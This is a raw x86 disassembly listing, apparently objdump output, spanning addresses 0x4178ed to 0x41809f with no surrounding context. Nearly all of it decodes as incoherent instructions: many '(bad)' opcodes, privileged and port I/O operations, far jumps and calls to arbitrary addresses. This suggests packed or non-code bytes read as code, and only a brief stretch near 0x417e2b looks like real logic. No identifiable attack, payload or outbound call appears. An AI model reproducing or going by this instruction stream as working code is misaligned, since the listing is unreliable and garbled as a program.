  4178ed:	xchg   ecx,eax
  4178ee:	xor    ebx,DWORD PTR [ebp+edi*8-0x7b6cf430]
  4178f5:	pop    es
  4178f6:	inc    esi
  4178f7:	xlat   BYTE PTR ds:[ebx]
  4178f8:	sbb    BYTE PTR [edx],0x9e
  4178fb:	out    0xef,eax
  4178fd:	mov    dl,BYTE PTR [eax+0x2]
  417900:	adc    eax,0xaa4fa403
  417905:	shl    al,1
  417907:	jb     0x417931
  417909:	mov    ebx,0xeadee4a8
  41790e:	shl    dl,cl
  417910:	pushf  
  417911:	loop   0x417903
  417913:	jae    0x417936
  417915:	repnz stos BYTE PTR es:[edi],al
  417917:	aaa    
  417918:	iret   
  417919:	push   ecx
  41791a:	icebp  
  41791b:	push   eax
  41791c:	xchg   ch,ch
  41791e:	fnstenv [eax]
  417920:	(bad)  
  417921:	sti    
  417922:	dec    eax
  417923:	cdq    
  417924:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417925:	pop    ds
  417926:	call   0x2f9c689d
  41792b:	jp     0x4178b6
  41792d:	pop    ss
  41792e:	arpl   WORD PTR [ebp-0x16111575],si
  417934:	mov    ebp,0xe85b02fb
  417939:	into   
  41793a:	adc    bh,BYTE PTR [edi+0x62]
  41793d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41793e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41793f:	cmp    ah,BYTE PTR [ebx-0xc290bcc]
  417945:	fwait
  417946:	inc    esi
  417947:	pop    ebx
  417948:	xor    DWORD PTR [edi-0x4b],edi
  41794b:	ins    BYTE PTR es:[edi],dx
  41794c:	adc    eax,ecx
  41794e:	mov    bl,0x18
  417950:	addr16 jl 0x417987
  417953:	fnstsw WORD PTR [ecx+0x4af28e6e]
  417959:	xchg   esi,eax
  41795a:	mul    ebp
  41795c:	mov    ebx,0x2f612687
  417961:	aad    0x3a
  417963:	pop    esi
  417964:	dec    eax
  417965:	fsub   QWORD PTR [edx+0x23]
  417968:	fnop   
  41796a:	or     DWORD PTR [eax-0x3e0844f8],esp
  417970:	push   eax
  417971:	add    eax,0x5bc05db
  417976:	mov    esp,0x915f70cb
  41797b:	lods   al,BYTE PTR ds:[esi]
  41797c:	jge    0x4179e5
  41797e:	stos   DWORD PTR es:[edi],eax
  41797f:	or     dh,dh
  417981:	add    BYTE PTR [ebx-0x79],0xb3
  417985:	xchg   edx,eax
  417986:	aad    0x40
  417988:	int3   
  417989:	pop    edx
  41798a:	adc    bl,BYTE PTR [eax+eiz*8]
  41798d:	lods   al,BYTE PTR ds:[esi]
  41798e:	xor    al,0x97
  417990:	pop    edi
  417991:	inc    ebx
  417992:	cmp    edx,edi
  417994:	daa    
  417995:	sub    eax,0x130cd94c
  41799a:	pop    ss
  41799b:	pop    ebx
  41799c:	shl    DWORD PTR [edx+0x1],cl
  41799f:	mov    eax,ds:0x47359293
  4179a4:	sar    dh,1
  4179a6:	sbb    eax,0xd578b5fa
  4179ac:	sub    BYTE PTR fs:[edx-0x9],0xc6
  4179b1:	in     eax,dx
  4179b2:	call   FWORD PTR [ecx+eiz*8-0x1dc47484]
  4179b9:	mov    ecx,0xd6ff35ad
  4179be:	hlt    
  4179bf:	enter  0x6ddd,0xe0
  4179c3:	daa    
  4179c4:	cld    
  4179c5:	(bad)  
  4179c6:	mov    eax,0x3e1aedda
  4179cb:	add    BYTE PTR [edx],bl
  4179cd:	mov    al,ds:0xdc490545
  4179d2:	mov    al,ds:0xad8d4cd
  4179d7:	mov    ebx,0x2fa5d62
  4179dc:	aaa    
  4179dd:	out    0x15,al
  4179df:	out    0xe5,al
  4179e1:	mov    dh,0xa8
  4179e3:	pop    es
  4179e4:	mov    ebx,0xffd8aada
  4179e9:	pushf  
  4179ea:	dec    esi
  4179eb:	push   esi
  4179ec:	or     ch,BYTE PTR [ecx+esi*2-0x4427ce58]
  4179f3:	mov    esi,0x45617219
  4179f8:	and    bl,BYTE PTR [edi+0x12875ec8]
  4179fe:	jb     0x41798d
  417a00:	in     al,0xc4
  417a02:	pop    eax
  417a03:	popf   
  417a04:	lock mov cl,0xac
  417a07:	jecxz  0x4179a8
  417a09:	xor    al,0xb5
  417a0b:	and    DWORD PTR [eax-0x2d],0x6910989a
  417a12:	inc    ebp
  417a13:	mov    dh,0x12
  417a15:	cld    
  417a16:	and    BYTE PTR [edi+0x72],dh
  417a19:	pop    ecx
  417a1a:	ins    DWORD PTR es:[edi],dx
  417a1b:	mov    WORD PTR ds:0xdc693c25,?
  417a21:	imul   esi,DWORD PTR [eax+0x18],0x5f
  417a25:	bound  ebp,QWORD PTR [ecx]
  417a27:	push   eax
  417a28:	jnp    0x417a1b
  417a2a:	mov    esi,0x6ffca519
  417a2f:	mov    al,ds:0xdff245e3
  417a34:	(bad)  
  417a35:	mov    ah,0xeb
  417a37:	jb     0x417a5d
  417a39:	inc    ebx
  417a3a:	stos   DWORD PTR es:[edi],eax
  417a3b:	pop    edi
  417a3c:	sbb    esp,0xffffffc7
  417a3f:	cmp    BYTE PTR [ebx+0x78e6738e],dh
  417a45:	std    
  417a46:	inc    esp
  417a47:	repnz sub cl,BYTE PTR [ecx+0xd]
  417a4b:	pop    ds
  417a4c:	test   DWORD PTR [ebx],edx
  417a4e:	mov    eax,0xdcc7dbbd
  417a53:	clc    
  417a54:	aam    0x71
  417a56:	adc    al,0x9
  417a58:	mov    ds:0xcbb30948,al
  417a5d:	aam    0xb9
  417a5f:	adc    cl,0xfe
  417a62:	(bad)  
  417a63:	dec    ebp
  417a64:	repz fnstenv [edi+ebp*2]
  417a68:	pop    es
  417a69:	test   al,0x97
  417a6b:	les    edx,FWORD PTR [esi+eax*4-0x55]
  417a6f:	imul   edi,DWORD PTR [ecx],0xffffffff
  417a72:	popa   
  417a73:	xor    ecx,DWORD PTR [esi-0x33b7af9a]
  417a79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417a7a:	hlt    
  417a7b:	and    eax,0x3ad85eb1
  417a80:	xchg   ebp,eax
  417a81:	fistp  DWORD PTR [esi+0x18461cd2]
  417a87:	and    eax,0x773d2bdc
  417a8c:	dec    edi
  417a8d:	rol    esp,1
  417a8f:	dec    esi
  417a90:	gs jbe 0x417a7b
  417a93:	or     bh,dl
  417a95:	and    dh,BYTE PTR ss:[ebp-0x2a]
  417a99:	jne    0x417a77
  417a9b:	and    edx,ebx
  417a9d:	sub    DWORD PTR [ebx-0x2d],esi
  417aa0:	cld    
  417aa1:	arpl   dx,bx
  417aa3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417aa4:	mov    ecx,0x7305db05
  417aa9:	adc    BYTE PTR [esp+ebx*4+0x2b],bh
  417aad:	aam    0xce
  417aaf:	pop    esp
  417ab0:	add    ebx,DWORD PTR [ecx]
  417ab2:	(bad)  
  417ab3:	push   ss
  417ab4:	shl    DWORD PTR [ebp+0x2c],0xbb
  417ab8:	jne    0x417ad7
  417aba:	mov    ebp,0xf17955e9
  417abf:	leave  
  417ac0:	aam    0x5e
  417ac2:	fisubr DWORD PTR [esi+ebp*2]
  417ac5:	mov    ebx,0x18e07951
  417aca:	loope  0x417b05
  417acc:	xchg   edx,eax
  417acd:	(bad)  
  417ace:	mov    ds:0x9912af1e,eax
  417ad3:	add    ebx,ebp
  417ad5:	inc    edi
  417ad6:	aaa    
  417ad7:	add    eax,0xf16c8d8a
  417adc:	sub    esp,ecx
  417ade:	adc    al,0x39
  417ae0:	jg     0x417a63
  417ae2:	mov    dh,0xa8
  417ae4:	push   ss
  417ae5:	mov    edx,0x809a67a8
  417aea:	stc    
  417aeb:	adc    eax,DWORD PTR [eax+esi*1]
  417aee:	lock xor eax,0xeddab5f0
  417af4:	dec    ebx
  417af5:	sahf   
  417af6:	fadd   QWORD PTR [edi]
  417af8:	montmul (bad)
  417af9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417afa:	add    BYTE PTR [edi],bh
  417afc:	(bad)  [ebx+ebx*8-0x7b]
  417b00:	fsubr  st,st(3)
  417b02:	loop   0x417aaf
  417b04:	call   0xa14715a3
  417b09:	cmp    esi,DWORD PTR [edx+0x2a]
  417b0c:	out    dx,eax
  417b0d:	mov    dl,0x74
  417b0f:	retf   
  417b10:	ret    0xfa1d
  417b13:	in     eax,0xb7
  417b15:	mov    ebx,0x5274fb06
  417b1a:	mov    esp,0xa44cb12d
  417b1f:	scas   al,BYTE PTR es:[edi]
  417b20:	mov    ?,WORD PTR ds:0x343ce6aa
  417b26:	hlt    
  417b27:	adc    esp,DWORD PTR [ecx-0x1b]
  417b2a:	shl    DWORD PTR [ecx],0xe2
  417b2d:	push   eax
  417b2e:	push   ecx
  417b2f:	aas    
  417b30:	es daa 
  417b32:	not    BYTE PTR [ecx+0x55431c33]
  417b38:	stos   BYTE PTR es:[edi],al
  417b39:	cs jl  0x417b0b
  417b3c:	sub    eax,0x6254a494
  417b41:	mov    ch,BYTE PTR [edi+eax*2]
  417b44:	adc    edi,DWORD PTR [ebx+0x3c]
  417b47:	stos   DWORD PTR es:[edi],eax
  417b48:	or     cl,dh
  417b4a:	mov    al,ds:0x98057d85
  417b4f:	push   esp
  417b50:	ins    BYTE PTR es:[edi],dx
  417b51:	jl     0x417bcb
  417b53:	imul   edi,esp,0x1c
  417b56:	cmc    
  417b57:	rcr    BYTE PTR [edx-0x2e8372f2],1
  417b5d:	bound  esi,QWORD PTR [edi+eax*2+0x76]
  417b61:	fwait
  417b62:	mov    dl,0x9a
  417b64:	mov    edi,0x4142b6e7
  417b69:	cmp    dl,cl
  417b6b:	fs pushf 
  417b6d:	sbb    BYTE PTR [ecx],al
  417b6f:	add    ch,BYTE PTR [eax-0x59]
  417b72:	aas    
  417b73:	push   eax
  417b74:	(bad)  
  417b75:	dec    DWORD PTR [ebx+0x6c]
  417b78:	fisttp DWORD PTR [ecx-0x6f]
  417b7b:	xor    BYTE PTR [edx],dl
  417b7d:	inc    ebp
  417b7e:	jmp    FWORD PTR [ebx-0x17]
  417b81:	cmp    cl,BYTE PTR [ecx]
  417b83:	in     al,dx
  417b84:	mov    ecx,0xd782d00
  417b89:	xlat   BYTE PTR ds:[ebx]
  417b8a:	dec    ebp
  417b8b:	call   0xa8f0dc1d
  417b90:	cmp    al,dl
  417b92:	and    BYTE PTR [edx-0x5d52f06],ah
  417b98:	call   DWORD PTR fs:[edi]
  417b9b:	addr16 fsubp st(3),st
  417b9e:	adc    edx,DWORD PTR [ebx]
  417ba0:	pusha  
  417ba1:	loopne 0x417b6d
  417ba3:	arpl   WORD PTR [edi],dx
  417ba5:	jmp    0x417b8a
  417ba7:	jbe    0x417bcb
  417ba9:	xchg   edx,eax
  417baa:	sbb    al,0xbe
  417bac:	adc    eax,0x2299cda7
  417bb1:	ja     0x417b64
  417bb3:	je     0x417bac
  417bb5:	xor    eax,0x973ba146
  417bba:	lds    ecx,FWORD PTR [esi+0x1f]
  417bbd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417bbe:	mov    esi,0x52ac164b
  417bc3:	in     al,0x84
  417bc5:	enter  0xeed7,0x98
  417bc9:	sbb    esp,DWORD PTR [edi+0x54]
  417bcc:	add    esi,DWORD PTR [esi]
  417bce:	add    cl,dl
  417bd0:	jno    0x417c03
  417bd2:	add    eax,0xa927f1a7
  417bd7:	sub    al,0x51
  417bd9:	mov    ecx,0x241cc4f3
  417bde:	je     0x417bdf
  417be0:	pop    edi
  417be1:	and    ch,BYTE PTR [esi+0x11]
  417be4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417be5:	pop    edi
  417be6:	out    0xd5,eax
  417be8:	push   edx
  417be9:	fild   QWORD PTR [ecx+0x5]
  417bec:	mov    cl,BYTE PTR [edx]
  417bee:	aaa    
  417bef:	scas   eax,DWORD PTR es:[edi]
  417bf0:	push   esi
  417bf1:	(bad)  
  417bf2:	es das 
  417bf4:	mov    ebp,0xb9a3433a
  417bf9:	jb     0x417c14
  417bfb:	nop
  417bfc:	and    dh,BYTE PTR [ecx+0x2a]
  417bff:	mov    bh,ch
  417c01:	push   cs
  417c02:	shr    DWORD PTR [ebp+0x7b],1
  417c05:	add    DWORD PTR [edx],0xab3914b6
  417c0b:	and    ecx,DWORD PTR [ecx+esi*4-0x3d615565]
  417c12:	push   ds
  417c13:	adc    ebx,0xffffff9c
  417c16:	and    ebp,DWORD PTR [eax-0x4]
  417c19:	pop    edi
  417c1a:	js     0x417ba0
  417c1c:	push   0x62
  417c1e:	fprem  
  417c20:	add    eax,0xedcd26b8
  417c25:	jge    0x417bdd
  417c27:	jmp    0x417c98
  417c29:	js     0x417beb
  417c2b:	fld1   
  417c2d:	icebp  
  417c2e:	dec    esp
  417c2f:	inc    esp
  417c30:	sub    sp,WORD PTR [ecx+0x7284bbb7]
  417c37:	or     BYTE PTR [eax-0x7d],dl
  417c3a:	(bad)  
  417c3b:	(bad)  
  417c3c:	retf   0xfcdc
  417c3f:	cdq    
  417c40:	push   0x6e
  417c42:	pop    eax
  417c43:	mov    ebx,0x7d7fd184
  417c48:	inc    ebp
  417c49:	cli    
  417c4a:	lahf   
  417c4b:	mov    dh,0x3
  417c4d:	iret   
  417c4e:	(bad)  
  417c4f:	mul    BYTE PTR [esi-0x20db0dd1]
  417c55:	dec    esp
  417c56:	(bad)  
  417c57:	sub    eax,0x3d85ad7a
  417c5c:	or     eax,ebx
  417c5e:	ret    0x9a9
  417c61:	loop   0x417c42
  417c63:	ins    BYTE PTR es:[edi],dx
  417c64:	popa   
  417c65:	sub    al,BYTE PTR [edx+0x4f21f881]
  417c6b:	add    edx,DWORD PTR [edx]
  417c6d:	add    edx,ebx
  417c6f:	and    ebx,DWORD PTR [ebx+edi*2-0x68f6efff]
  417c76:	dec    esi
  417c77:	jmp    0xee64:0x7bb277d9
  417c7e:	pushf  
  417c7f:	stos   DWORD PTR es:[edi],eax
  417c80:	(bad)  
  417c81:	jecxz  0x417c65
  417c83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417c84:	or     DWORD PTR [ecx],esp
  417c86:	repnz inc esp
  417c88:	mov    eax,ds:0x93089a55
  417c8d:	fcmovne st,st(2)
  417c8f:	pop    es
  417c90:	dec    esp
  417c91:	sub    esp,DWORD PTR [edi]
  417c93:	retf   
  417c94:	or     cl,BYTE PTR [ebx]
  417c96:	pop    edi
  417c97:	jb     0x417c40
  417c99:	push   esi
  417c9a:	js     0x417ce9
  417c9c:	xor    eax,0xc7dad61d
  417ca1:	out    0xc9,eax
  417ca3:	test   al,0x8c
  417ca5:	out    0xe7,al
  417ca7:	xchg   esp,eax
  417ca8:	and    al,ah
  417caa:	xchg   ebx,eax
  417cab:	dec    edx
  417cac:	ss jns 0x417cbd
  417caf:	addr16 (bad) 
  417cb1:	push   eax
  417cb2:	test   ebp,esi
  417cb4:	aaa    
  417cb5:	fwait
  417cb6:	xchg   ecx,eax
  417cb7:	jb     0x417cdb
  417cb9:	fwait
  417cba:	sbb    BYTE PTR [eax+0x4ad53b15],bh
  417cc0:	arpl   sp,di
  417cc2:	je     0x417cfe
  417cc4:	jae    0x417ca8
  417cc6:	mov    dl,0x9a
  417cc8:	in     al,0x7b
  417cca:	aad    0x65
  417ccc:	and    al,0x72
  417cce:	loop   0x417d2f
  417cd0:	repnz pop ebp
  417cd2:	bound  eax,QWORD PTR [esi-0x628035f6]
  417cd8:	ins    DWORD PTR es:[edi],dx
  417cd9:	test   ah,ch
  417cdb:	push   ss
  417cdc:	fidivr DWORD PTR [esp+ebp*2-0x45d829f0]
  417ce3:	call   0x38c07649
  417ce8:	out    0x5,al
  417cea:	xchg   BYTE PTR [edi+0x7],dl
  417ced:	fild   QWORD PTR [edi]
  417cef:	pop    ebp
  417cf0:	push   ebp
  417cf1:	into   
  417cf2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417cf3:	pop    eax
  417cf4:	pop    ds
  417cf5:	sbb    eax,0x551a2581
  417cfa:	pop    ss
  417cfb:	daa    
  417cfc:	pop    esi
  417cfd:	add    DWORD PTR [ecx+0x6a3b14f3],0x65
  417d04:	addr16 das 
  417d06:	pop    ebp
  417d07:	jne    0x417cd2
  417d09:	jp     0x417d29
  417d0b:	mov    WORD PTR [ebx-0x3],gs
  417d0e:	fsub   DWORD PTR [edi-0x49]
  417d11:	xchg   ebx,eax
  417d12:	mov    al,ds:0x4542a5c6
  417d17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417d18:	mov    edi,0xdcf7d9f1
  417d1d:	sbb    BYTE PTR [esi+0x4a5f96a6],al
  417d23:	(bad)  
  417d24:	jecxz  0x417cdb
  417d26:	push   es
  417d27:	fsubrp st(6),st
  417d29:	mov    edx,0xe01f2d28
  417d2e:	mov    bh,0x2d
  417d30:	test   al,0x7f
  417d32:	add    BYTE PTR [ecx],dl
  417d34:	push   esp
  417d35:	int    0x4e
  417d37:	xor    DWORD PTR [esp+esi*4],0xffffffc7
  417d3b:	(bad)  
  417d3c:	or     edi,edx
  417d3e:	arpl   bp,si
  417d40:	data16 cmp BYTE PTR [eax+0x5eead329],al
  417d47:	call   0x504c6697
  417d4c:	outs   dx,DWORD PTR ds:[esi]
  417d4d:	xchg   edx,eax
  417d4e:	jnp    0x417d81
  417d50:	jns    0x417daa
  417d52:	lods   al,BYTE PTR ds:[esi]
  417d53:	xor    DWORD PTR [edx+0x250c02a8],0xa04ce199
  417d5d:	inc    ebp
  417d5e:	sub    DWORD PTR [edi-0x4f5b5ae6],eax
  417d64:	lds    ecx,FWORD PTR [edi-0x68]
  417d67:	test   al,0xd1
  417d69:	xchg   ebx,eax
  417d6a:	aad    0x49
  417d6c:	fcmovnb st,st(6)
  417d6e:	jno    0x417da6
  417d70:	dec    esi
  417d71:	pusha  
  417d72:	mov    BYTE PTR [ebx+0x449b58e9],ch
  417d78:	add    esp,DWORD PTR [esi]
  417d7a:	rcr    BYTE PTR [ebp-0x9],0x96
  417d7e:	loopne 0x417d25
  417d80:	lods   eax,DWORD PTR ds:[esi]
  417d81:	jmp    0xf634:0x3be28bc3
  417d88:	dec    eax
  417d89:	mov    BYTE PTR ds:0xe2dd6318,bl
  417d8f:	pop    edx
  417d90:	mov    dl,0x4e
  417d92:	(bad)  
  417d94:	fnsave [ebp-0x69]
  417d97:	jl     0x417d22
  417d99:	stos   BYTE PTR es:[edi],al
  417d9a:	xchg   ecx,eax
  417d9b:	aam    0x93
  417d9d:	jmp    0xb2cc:0xa7715362
  417da4:	pop    edi
  417da5:	call   0xa5b4:0x4128f287
  417dac:	mov    dl,0xed
  417dae:	xchg   esi,eax
  417daf:	and    al,0xe5
  417db1:	jne    0x417dce
  417db3:	adc    eax,0x3290d28
  417db8:	pop    esp
  417db9:	aas    
  417dba:	loope  0x417d79
  417dbc:	jge    0x417d51
  417dbe:	sub    BYTE PTR [esi],0x6
  417dc1:	stos   BYTE PTR es:[edi],al
  417dc2:	leave  
  417dc3:	fs add ebp,edi
  417dc6:	dec    esp
  417dc7:	fsub   QWORD PTR [esi]
  417dc9:	adc    DWORD PTR [ebx-0x3f],edx
  417dcc:	push   es
  417dcd:	sub    bh,BYTE PTR [edx-0x563e60fd]
  417dd3:	dec    edi
  417dd4:	adc    eax,0x554472ca
  417dd9:	rcl    DWORD PTR [edi],cl
  417ddb:	push   ebp
  417ddc:	stos   BYTE PTR es:[edi],al
  417ddd:	stos   BYTE PTR es:[edi],al
  417dde:	fnstsw WORD PTR [edi-0x6786e419]
  417de4:	mov    dl,0x73
  417de6:	sub    DWORD PTR [ebx+ecx*8+0x5260fbd6],0x3f93d89a
  417df1:	test   DWORD PTR [eax+0x5a8744a7],esi
  417df7:	scas   al,BYTE PTR es:[edi]
  417df8:	pop    ebx
  417df9:	xchg   edx,eax
  417dfa:	cld    
  417dfb:	add    cl,ah
  417dfd:	xchg   edx,eax
  417dfe:	push   0xaa9a174d
  417e03:	addr16 pop ax
  417e06:	or     BYTE PTR [eax-0x1f],ah
  417e09:	add    BYTE PTR [edx],al
  417e0b:	push   0x4561bd80
  417e10:	fild   QWORD PTR [ecx]
  417e12:	dec    ecx
  417e13:	adc    esp,DWORD PTR [eax-0x4f]
  417e16:	inc    ebx
  417e17:	fcomp  DWORD PTR [edi-0x22]
  417e1a:	add    bh,BYTE PTR [edi+ebp*8-0x1eb7dce]
  417e21:	in     al,0xb5
  417e23:	jg     0x417e4a
  417e25:	rcr    dh,1
  417e27:	fucomp st(6)
  417e29:	jg     0x417e92
  417e2b:	mov    ecx,DWORD PTR [ebp-0x20]
  417e2e:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  417e35:	mov    edx,DWORD PTR [ebp+0xc]
  417e38:	cmp    cl,BYTE PTR [edx]
  417e3a:	jne    0x420de3
  417e40:	mov    ecx,DWORD PTR [ebp-0x14]
  417e43:	mov    edx,DWORD PTR [ebp+0xc]
  417e46:	movsx  edx,BYTE PTR [edx]
  417e49:	xor    ecx,eax
  417e4b:	add    ecx,esi
  417e4d:	jmp    0x41a1da
  417e52:	cmp    DWORD PTR [ecx],ecx
  417e54:	mov    ebp,0x79c6ad42
  417e59:	stc    
  417e5a:	mov    DWORD PTR [ebp-0x58],edi
  417e5d:	(bad)  
  417e5f:	(bad)  
  417e60:	jo     0x417eaf
  417e62:	fidivr WORD PTR [eax]
  417e64:	jge    0x417ee0
  417e66:	or     bl,BYTE PTR [edi+0x7a]
  417e69:	jp     0x417ee3
  417e6b:	push   0xffffffb1
  417e6d:	pop    esp
  417e6e:	jg     0x417ed9
  417e70:	test   al,0x9d
  417e72:	jg     0x417e82
  417e74:	rol    BYTE PTR [edi+edi*2-0x293d40bd],cl
  417e7b:	mov    ah,0xfe
  417e7d:	popa   
  417e7e:	sbb    DWORD PTR [edi-0x1b],0x17
  417e82:	bound  esi,QWORD PTR [ebp-0x7a]
  417e85:	sbb    eax,0x57efbe00
  417e8a:	(bad)  
  417e8c:	add    ebx,0xffffffe8
  417e8f:	or     DWORD PTR [ebx+0xc9d2451],edx
  417e95:	lahf   
  417e96:	pushf  
  417e97:	mov    edx,DWORD PTR [ebx]
  417e99:	(bad)  
  417e9a:	sbb    eax,0x3c1b54ae
  417e9f:	scas   al,BYTE PTR es:[edi]
  417ea0:	test   edi,ebp
  417ea2:	lods   eax,DWORD PTR ds:[esi]
  417ea3:	mov    bh,BYTE PTR [ebx]
  417ea5:	pop    edx
  417ea6:	jle    0x417e7a
  417ea8:	ret    
  417ea9:	pop    es
  417eaa:	or     dh,al
  417eac:	jae    0x417ef0
  417eae:	mov    dh,0xfd
  417eb0:	lea    edx,[esp+ecx*4-0x598de53f]
  417eb7:	pushf  
  417eb8:	pop    ebx
  417eb9:	pusha  
  417eba:	ins    DWORD PTR es:[edi],dx
  417ebb:	leave  
  417ebc:	or     al,cl
  417ebe:	loopne 0x417e91
  417ec0:	add    ch,BYTE PTR [edi]
  417ec2:	push   ss
  417ec3:	push   ebx
  417ec4:	pop    esp
  417ec5:	bound  ecx,QWORD PTR [edx]
  417ec7:	lea    esi,es:0x11b5a4e3
  417ece:	or     ebx,esi
  417ed0:	add    ah,BYTE PTR [eax]
  417ed2:	push   eax
  417ed3:	mov    ebx,0x531d3a26
  417ed8:	fimul  DWORD PTR [esi]
  417eda:	xchg   esp,eax
  417edb:	in     al,dx
  417edc:	add    eax,0xf1711c94
  417ee1:	pop    esi
  417ee2:	xchg   ebp,eax
  417ee3:	jnp    0x417ea2
  417ee5:	sub    BYTE PTR [edx-0x53],0x78
  417ee9:	aad    0xb9
  417eeb:	mov    al,0x7c
  417eed:	data16 gs lock jmp 0x417f04
  417ef2:	call   0xcdbc32ae
  417ef7:	sbb    BYTE PTR [ebp-0x9f0aed6],ah
  417efd:	xchg   edx,eax
  417efe:	call   DWORD PTR [ebp+0x7c]
  417f01:	rcr    DWORD PTR [eax+eax*8-0x3f],1
  417f05:	sahf   
  417f06:	inc    ebp
  417f07:	add    bl,0x6e
  417f0a:	mov    al,0x4b
  417f0c:	lahf   
  417f0d:	push   ecx
  417f0e:	test   BYTE PTR [esi],dh
  417f10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417f11:	xchg   DWORD PTR [esi+ebp*8],edx
  417f14:	and    BYTE PTR [ecx-0x268c4d8f],0x68
  417f1b:	or     ecx,DWORD PTR [ecx+eax*1+0x1f4af41a]
  417f22:	pop    ds
  417f23:	std    
  417f24:	pushf  
  417f25:	outs   dx,DWORD PTR ds:[esi]
  417f26:	jmp    0x49ae:0x7958e675
  417f2d:	or     eax,0x8f9b5ebf
  417f32:	add    DWORD PTR [ebx+eiz*8],esp
  417f35:	mov    esi,0x45b2d561
  417f3a:	(bad)  
  417f3b:	adc    eax,0x42bb724
  417f40:	mov    al,BYTE PTR [ebx+0x65]
  417f43:	jg     0x417f0e
  417f45:	xlat   BYTE PTR ds:[ebx]
  417f46:	aad    0x10
  417f48:	fs pop edx
  417f4a:	or     edx,DWORD PTR [edx]
  417f4c:	adc    bh,bh
  417f4e:	inc    edx
  417f4f:	sbb    BYTE PTR [ebx-0x3cd28126],dl
  417f55:	sub    al,0x38
  417f57:	ins    BYTE PTR es:[edi],dx
  417f58:	jp     0x417eee
  417f5a:	lods   al,BYTE PTR ds:[esi]
  417f5b:	adc    DWORD PTR [ecx],0xdf5e9a69
  417f61:	inc    ebp
  417f62:	fwait
  417f63:	add    al,0x99
  417f65:	std    
  417f66:	or     DWORD PTR [eax+0x3c],ebp
  417f69:	mov    esp,0x8938faf
  417f6e:	fistp  WORD PTR [esi]
  417f70:	dec    edx
  417f71:	jne    0x417f49
  417f73:	sub    dl,BYTE PTR ds:0xc3069305
  417f79:	leave  
  417f7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417f7b:	mov    esi,0x30c16c27
  417f80:	cmc    
  417f81:	rcl    DWORD PTR [esi+0x45],cl
  417f84:	cld    
  417f85:	jb     0x417fe0
  417f87:	xchg   ebp,eax
  417f88:	ds aam 0xa3
  417f8b:	clc    
  417f8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417f8d:	sbb    eax,0x3432fcec
  417f92:	and    al,al
  417f94:	(bad)  
  417f95:	aad    0x9d
  417f97:	pop    ds
  417f98:	mov    bh,0xdf
  417f9a:	cmp    ecx,ecx
  417f9c:	rcl    BYTE PTR [ecx+0x79fce1b7],1
  417fa2:	(bad)  
  417fa4:	xchg   esp,eax
  417fa5:	jne    0x417fae
  417fa7:	jno    0x417fe9
  417fa9:	dec    esp
  417faa:	aaa    
  417fab:	and    al,0x48
  417fad:	and    eax,0xe5a22522
  417fb2:	out    0xdb,al
  417fb4:	mov    bl,0xba
  417fb6:	in     eax,dx
  417fb7:	test   bl,cl
  417fb9:	sub    BYTE PTR [eax+0x557c0d81],dl
  417fbf:	jno    0x41802d
  417fc1:	lahf   
  417fc2:	pop    ecx
  417fc3:	call   0x19d4455
  417fc8:	cmp    eax,0x6baf617b
  417fcd:	sub    eax,0xae293c9f
  417fd2:	imul   edx,DWORD PTR ds:0x712f3b61,0xffffff9b
  417fd9:	data16 sbb ah,BYTE PTR ds:0x7d8bdeac
  417fe0:	xor    BYTE PTR [ecx+0x67],ch
  417fe3:	pop    ebp
  417fe4:	and    BYTE PTR [esi+0x19ccf560],ah
  417fea:	pop    esp
  417feb:	dec    eax
  417fec:	hlt    
  417fed:	int3   
  417fee:	imul   BYTE PTR [edi]
  417ff0:	jmp    0x6277fb65
  417ff5:	mov    ds,WORD PTR [edi-0x2e]
  417ff8:	retf   
  417ff9:	and    ch,BYTE PTR [eax+0x54]
  417ffc:	adc    al,bl
  417ffe:	mov    esp,0x431b17b5
  418003:	mov    esp,0xa24d9ef6
  418008:	test   BYTE PTR ds:[eax+0x706e1b6],0x39
  418010:	and    BYTE PTR [edx+0x6cdfd26a],al
  418016:	inc    edi
  418017:	adc    ebp,esp
  418019:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41801a:	ss sbb eax,0x605ee83b
  418020:	in     al,dx
  418021:	aam    0xd0
  418023:	mov    BYTE PTR [ebp-0x58991aa7],al
  418029:	adc    ebx,DWORD PTR [ecx+0x75c61f2]
  41802f:	shl    DWORD PTR [edi],cl
  418031:	fst    QWORD PTR [esi]
  418033:	fst    QWORD PTR [edi+0x16]
  418036:	call   0x3a3d:0xf83db941
  41803d:	and    DWORD PTR [edx+0x2b],edx
  418040:	je     0x417fde
  418042:	xchg   esp,eax
  418043:	(bad)
  418047:	push   ebx
  418048:	fwait
  418049:	out    0xd3,al
  41804b:	fistp  DWORD PTR [eax-0x31319fd0]
  418051:	cmp    BYTE PTR [esi+0x46],dh
  418054:	xor    al,BYTE PTR [ecx-0x56]
  418057:	mov    esi,0xb25fa07f
  41805c:	pop    ebp
  41805d:	int    0xc7
  41805f:	fbstp  TBYTE PTR ds:0x5e514985
  418065:	das    
  418066:	mov    dh,0x72
  418068:	cmp    BYTE PTR [eax+0x69],bl
  41806b:	sbb    al,0x4c
  41806d:	arpl   cx,cx
  41806f:	cmp    esi,ebp
  418071:	xor    edx,DWORD PTR [ebx]
  418073:	aad    0xd8
  418075:	push   edx
  418077:	cmp    bl,ah
  418079:	and    al,bl
  41807b:	jp     0x4180df
  41807d:	sbb    BYTE PTR ss:[edi+ebx*1],al
  418081:	repz call 0x1f6a:0x2e426446
  418089:	pop    ds
  41808a:	mov    bh,0xe
  41808c:	in     eax,dx
  41808d:	mov    ecx,0x20bbfd6d
  418092:	jg     0x4180cb
  418094:	repnz mov ds,ebx
  418097:	pop    esi
  418098:	push   edi
  418099:	xchg   ecx,eax
  41809a:	arpl   di,di
  41809c:	fwait
  41809d:	ja     0x418078
  41809f:	int    0xe1
